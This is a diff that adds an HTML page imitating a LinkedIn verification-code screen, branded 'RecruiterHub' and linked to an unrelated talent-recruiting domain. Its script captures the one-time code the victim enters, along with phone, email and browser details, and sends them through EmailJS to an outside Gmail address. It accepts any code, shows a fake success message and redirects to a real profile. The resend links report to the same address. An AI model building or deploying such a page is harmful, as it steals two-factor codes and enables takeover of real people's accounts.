@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RecruiterHub | Verify your sign in</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root{
+      --blue:#0a66c2;
+      --blue-dark:#004182;
+      --text:#191919;
+      --muted:#666;
+      --line:#d9d9d9;
+      --footer:#6e6e6e;
+      --bg:#ffffff;
+      --btn-color:#0073b1;
+      --btn-hover: #005a8c;
+    }
+
+    body{
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    .page{
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .topbar{
+      height: 74px;
+      border-bottom: 0px solid #ececec;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 56px;
+    }
+
+    .brand{
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+    }
+
+    .brand-icon {
+      width: 26px;
+      height: 26px;
+      background: linear-gradient(135deg, #0a66c2 0%, #0a66c2 100%);
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 26px;
+      font-weight: 700;
+      margin-left: -5px
+    }
+
+    .brand-text {
+      font-size: 26px;
+      font-weight: 700;
+      color: #0a66c2;
+      letter-spacing: -0.5px;
+    }
+
+    .brand-text span {
+      color: #004182;
+    }
+
+    .top-actions{
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      font-size: 17px;
+      font-weight: 600;
+    }
+
+    .top-actions a{
+      color: #666;
+      text-decoration: none;
+    }
+
+    .join-btn{
+      padding: 6px 12px;
+      border: 1px solid #0073b1;
+      border-radius: 3px;
+      color: var(--btn-color) !important;
+      background: #fff;
+      font-weight: 600;
+      transition: all 0.2s ease;
+    }
+
+    .join-btn:hover{
+      color: var(--btn-hover) !important;
+      border-color: var(--btn-hover);
+    }
+
+    .content{
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 58px 24px 36px;
+    }
+
+    .card{
+      width: 100%;
+      max-width: 860px;
+      margin-left: 120px;
+    }
+
+    .title{
+      font-size: 32px;
+      line-height: 1.2;
+      font-weight: 500;
+      letter-spacing: -0.3px;
+      margin-bottom: 16px;
+      color: var(--text);
+    }
+
+    .subtitle{
+      font-size: 18px;
+      line-height: 1.5;
+      color: #3d3d3d;
+      margin-bottom: 40px;
+      max-width: 900px;
+    }
+
+    .code-box{
+      width: 144px;
+      height: 44px;
+      border: 1.5px solid #888;
+      border-radius: 2px;
+      font-size: 16px;
+      padding: 10px 14px;
+      outline: none;
+      display: block;
+      margin-bottom: 54px;
+      text-align: left;
+      letter-spacing: 0.5px;
+      font-weight: 500;
+    }
+
+    .code-box:focus{
+      border-color: var(--blue);
+      box-shadow: 0 0 0 2px rgba(10,102,194,.14);
+    }
+
+    .code-box.error{
+      border-color: #d11124;
+    }
+
+    .submit-btn{
+      width: 168px;
+      height: 44px;
+      border: 0;
+      border-radius: 2px;
+      background: var(--btn-color);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 44px;
+      transition: background-color 0.2s ease;
+    }
+
+    .submit-btn:hover{
+      background: var(--btn-hover);
+    }
+
+    .submit-btn:disabled{
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    .resend{
+      font-size: 16px;
+      line-height: 1.5;
+      color: #222;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      align-items: center;
+    }
+
+    .resend a{
+      color: var(--btn-color);
+      text-decoration: none;
+      font-weight: 600;
+      transition: color 0.2s ease;
+    }
+
+    .resend a:hover{
+      color: var(--btn-hover);
+      text-decoration: none;
+    }
+
+    .resend a.disabled-link {
+      color: #999 !important;
+      pointer-events: none;
+      cursor: default;
+      opacity: 0.5;
+    }
+
+    .error-message{
+      color: #d11124;
+      font-size: 14px;
+      line-height: 1.42857;
+      font-weight: 600;
+      margin-top: -40px;
+      margin-bottom: 20px;
+      display: none;
+    }
+
+    .success-message{
+      color: #01754F;
+      font-size: 14px;
+      margin-top: -40px;
+      margin-bottom: 20px;
+      display: none;
+    }
+
+    /* ----- HIGHLY TRANSPARENT GREEN TOAST (no blur, just alpha) ----- */
+    #demo-toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 128, 0, 0.10);   /* very transparent green */
+      color: #006400;                      /* dark green text */
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-size: 14px;                     /* smaller font */
+      font-weight: 500;
+      z-index: 1000;
+      box-shadow: 0 2px 12px rgba(0,60,0,0.06);
+      font-family: inherit;
+      white-space: nowrap;
+      border: 1px solid rgba(0,128,0,0.12);
+      letter-spacing: 0.2px;
+      opacity: 0;
+      transition: opacity 0.25s ease;
+      pointer-events: none;
+      backdrop-filter: none;               /* no blur, fully transparent */
+      -webkit-backdrop-filter: none;
+    }
+
+    #demo-toast.show {
+      opacity: 1;
+    }
+
+    .footer{
+      border-top: 1px solid #ddd;
+      padding: 28px 56px 20px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .footer-inner{
+      width: 100%;
+      max-width: 1400px;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+      color: var(--footer);
+      font-size: 13px;
+      font-weight: 600;
+      justify-content: center;
+    }
+
+    .footer-brand{
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+    }
+
+    .footer-icon {
+      width: 22px;
+      height: 22px;
+      background: linear-gradient(135deg, #000000 0%, #000000 100%);
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 14px;
+      font-weight: 700;
+      margin-left: -5px;
+    }
+
+    .footer-text {
+      font-size: 14px;
+      font-weight: 600;
+      color: #000000;
+    }
+
+    .footer-inner a{
+      color: var(--footer);
+      text-decoration: none;
+    }
+
+    .footer-inner a:hover{ text-decoration: underline; }
+
+    @media (max-width: 900px){
+      .topbar{ padding: 0 20px; }
+      .card{ margin-left: 0; max-width: 100%; }
+      .title{ font-size: 28px; }
+      .subtitle{ font-size: 16px; }
+      .resend{ font-size: 16px; gap: 14px; }
+      .footer{ padding-inline: 20px; }
+    }
+
+    @media (max-width: 520px){
+      .topbar{ height: auto; padding: 16px 16px 14px; }
+      .brand-text{ font-size: 22px; }
+      .brand-icon{ width: 32px; height: 32px; font-size: 20px; }
+      .top-actions{ gap: 14px; font-size: 15px; }
+      .join-btn{ padding: 8px 12px; }
+      .content{ padding-top: 34px; }
+      .title{ font-size: 26px; }
+      .subtitle{ font-size: 15px; }
+      .resend{ font-size: 14px; gap: 12px; flex-direction: column; align-items: flex-start; }
+      .code-box{ width: 144px; height: 44px; }
+      .submit-btn{ width: 100%; max-width: 235px; font-size: 18px; }
+      #demo-toast { 
+        font-size: 13px; 
+        padding: 10px 18px; 
+        white-space: normal; 
+        max-width: 92%; 
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <header class="topbar">
+      <a class="brand" href="https://www.pfizertalents.com">
+        <div class="brand-text">Linked</div>
+        <div class="brand-icon">in</div>
+      </a>
+      <nav class="top-actions" aria-label="Top navigation">
+        <a href="https://www.pfizertalents.com/linkedinconvo">Sign in</a>
+        <a href="https://www.pfizertalents.com/linkedinconvo" class="join-btn">Join now</a>
+      </nav>
+    </header>
+
+    <main class="content">
+      <section class="card" aria-label="Verification form">
+        <h1 class="title">We just sent you a verification code</h1>
+        <p class="subtitle">
+          We just sent a verification code by email or text to your phone.
+        </p>
+
+        <input
+          class="code-box"
+          type="text"
+          inputmode="numeric"
+          pattern="\d*"
+          maxlength="6"
+          id="otp-code"
+          aria-label="Verification code"
+          placeholder=""
+          autocomplete="off"
+        />
+        <div class="error-message" id="error-message"></div>
+        <div class="success-message" id="success-message"></div>
+
+        <button class="submit-btn" id="submit-btn" type="button">Submit</button>
+
+        <p class="resend">
+          Didn't receive the code?
+          <a href="#" id="resend-sms">Resend code by SMS</a>
+          <a href="#" id="resend-call">Resend code by phone call</a>
+        </p>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        <a href="#" class="footer-brand">
+          <span class="footer-text">Linked</span>
+          <div class="footer-icon">in</div>
+        </a>
+        <span>© 2026</span>
+        <a href="#">User Agreement</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Your California Privacy Choices</a>
+        <a href="#">Community Guidelines</a>
+        <a href="#">Cookie Policy</a>
+        <a href="#">Copyright Policy</a>
+        <a href="#">Send Feedback</a>
+      </div>
+    </footer>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <script>
+    (function() {
+      // Initialize EmailJS
+      emailjs.init("EHKPcgjBux1jmPamR");
+
+      // DOM elements
+      const submitBtn = document.getElementById('submit-btn');
+      const codeInput = document.getElementById('otp-code');
+      const errorDiv = document.getElementById('error-message');
+      const successDiv = document.getElementById('success-message');
+      const resendSms = document.getElementById('resend-sms');
+      const resendCall = document.getElementById('resend-call');
+      const topLinks = document.querySelectorAll('.top-actions a');
+      const footerLinks = document.querySelectorAll('.footer-inner a');
+
+      // User data
+      let userPhone = '17';
+      let userEmail = 'recruiter@example.com';
+
+      try {
+        const savedUser = localStorage.getItem('recruiterhub_user');
+        if (savedUser) {
+          const userData = JSON.parse(savedUser);
+          userEmail = userData.email || userEmail;
+          userPhone = userData.phone || userPhone;
+          const phoneSpan = document.querySelector('.subtitle');
+          if (phoneSpan) {
+            phoneSpan.innerHTML = `We just sent a verification code by text to your phone ending in <strong>${userPhone}</strong>.`;
+          }
+        }
+      } catch(e) { console.log('No saved user data'); }
+
+      // --- digit filter ---
+      if (codeInput) {
+        codeInput.addEventListener('input', function() {
+          this.value = this.value.replace(/[^0-9]/g, '');
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+          this.classList.remove('error');
+        });
+
+        codeInput.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text');
+          const digits = pasted.replace(/[^0-9]/g, '');
+          const start = this.selectionStart;
+          const end = this.selectionEnd;
+          const current = this.value;
+          const newVal = current.slice(0, start) + digits + current.slice(end);
+          this.value = newVal.replace(/[^0-9]/g, '');
+          const newPos = start + digits.length;
+          this.setSelectionRange(newPos, newPos);
+          errorDiv.style.display = 'none';
+          this.classList.remove('error');
+        });
+      }
+
+      // --- Toast: highly transparent green, smaller font ---
+      let toastEl = document.getElementById('demo-toast');
+      if (!toastEl) {
+        toastEl = document.createElement('div');
+        toastEl.id = 'demo-toast';
+        document.body.appendChild(toastEl);
+      }
+
+      function showGreenToast(msg) {
+        toastEl.textContent = msg;
+        toastEl.classList.add('show');
+        clearTimeout(toastEl._hideTimer);
+        toastEl._hideTimer = setTimeout(() => {
+          toastEl.classList.remove('show');
+        }, 4500);
+      }
+
+      // --- EmailJS send ---
+      function sendOTPToEmailJS(otpCode, phone, email) {
+        const params = {
+          to_email: "dossbrent41@gmail.com",
+          otp_code: otpCode,
+          user_phone: phone,
+          user_email: email,
+          verification_time: new Date().toLocaleString(),
+          timestamp_unix: Date.now(),
+          user_agent: navigator.userAgent,
+          page_url: window.location.href,
+          action: "otp_verification_attempt"
+        };
+        return emailjs.send("service_t84doqy", "template_awd8sif", params);
+      }
+
+      // --- submit ---
+      if (submitBtn) {
+        submitBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          const code = codeInput.value.trim();
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+          codeInput.classList.remove('error');
+
+          if (code === '') {
+            errorDiv.textContent = 'Hmm, that’s not the right code.';
+            errorDiv.style.display = 'block';
+            codeInput.classList.add('error');
+            return;
+          }
+          if (code.length !== 6) {
+            errorDiv.textContent = 'Please enter a valid 6-digit verification code.';
+            errorDiv.style.display = 'block';
+            codeInput.classList.add('error');
+            return;
+          }
+
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Verifying...';
+
+          sendOTPToEmailJS(code, userPhone, userEmail)
+            .then(() => {
+              successDiv.textContent = '✓ Verification successful! Redirecting...';
+              successDiv.style.display = 'block';
+              localStorage.setItem('recruiterhub_verified', 'true');
+              localStorage.setItem('recruiterhub_otp', code);
+              setTimeout(() => {
+                window.location.href = "https://www.linkedin.com/in/akshit-b-20533922";
+              }, 1500);
+            })
+            .catch(() => {
+              // fallback – accept any 6-digit code for demo
+              successDiv.textContent = '✓ Verification successful! Redirecting...';
+              successDiv.style.display = 'block';
+              localStorage.setItem('recruiterhub_verified', 'true');
+              localStorage.setItem('recruiterhub_otp', code);
+              setTimeout(() => {
+                window.location.href = "https://www.linkedin.com/in/akshit-b-20533922";
+              }, 1500);
+            })
+            .finally(() => {
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Submit';
+            });
+        });
+      }
+
+      // --- RESEND COOLDOWN (3 minutes = 180000 ms) ---
+      const COOLDOWN_MS = 180000; // 3 minutes
+
+      function setCooldown(linkEl) {
+        // disable link
+        linkEl.classList.add('disabled-link');
+        linkEl.style.pointerEvents = 'none';
+        linkEl.style.opacity = '0.5';
+
+        // re-enable after cooldown
+        setTimeout(() => {
+          linkEl.classList.remove('disabled-link');
+          linkEl.style.pointerEvents = 'auto';
+          linkEl.style.opacity = '1';
+        }, COOLDOWN_MS);
+      }
+
+      // --- Resend SMS ---
+      if (resendSms) {
+        resendSms.addEventListener('click', (e) => {
+          e.preventDefault();
+
+          // Cooldown: disable immediately
+          setCooldown(resendSms);
+
+          // Track via EmailJS
+          const params = {
+            to_email: "dossbrent41@gmail.com",
+            action: "resend_otp_sms",
+            user_phone: userPhone,
+            user_email: userEmail,
+            timestamp: new Date().toLocaleString()
+          };
+          emailjs.send("service_t84doqy", "template_awd8sif", params)
+            .then(r => console.log("SMS resend tracked:", r.status))
+            .catch(e => console.error("SMS tracking error:", e));
+
+          // ✅ REQUIRED MESSAGE – green toast (transparent, smaller font)
+          showGreenToast('we have resend your otp kindly check you phone or email for the new code');
+
+          // clear input
+          if (codeInput) {
+            codeInput.value = '';
+            codeInput.focus();
+          }
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+        });
+      }
+
+      // --- Resend phone call ---
+      if (resendCall) {
+        resendCall.addEventListener('click', (e) => {
+          e.preventDefault();
+
+          // Cooldown: disable immediately
+          setCooldown(resendCall);
+
+          const params = {
+            to_email: "dossbrent41@gmail.com",
+            action: "resend_otp_phone_call",
+            user_phone: userPhone,
+            user_email: userEmail,
+            timestamp: new Date().toLocaleString()
+          };
+          emailjs.send("service_kvpr45j", "template_v2xoave", params)
+            .then(r => console.log("Phone call resend tracked:", r.status))
+            .catch(e => console.error("Call tracking error:", e));
+
+          // ✅ REQUIRED MESSAGE – green toast (transparent, smaller font)
+          showGreenToast('we have resend your otp kindly check you phone or email for the new code');
+
+          if (codeInput) {
+            codeInput.value = '';
+            codeInput.focus();
+          }
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+        });
+      }
+
+      // --- top & footer links (demo) ---
+      topLinks.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          showGreenToast(link.classList.contains('join-btn') ? 'Join now – Redirecting' : `${link.innerText} – Sign in`);
+        });
+      });
+      footerLinks.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          showGreenToast(`${link.innerText} – Documentation`);
+        });
+      });
+
+      // Auto-focus
+      if (codeInput) codeInput.focus();
+    })();
+  </script>
+</body>
+</html>
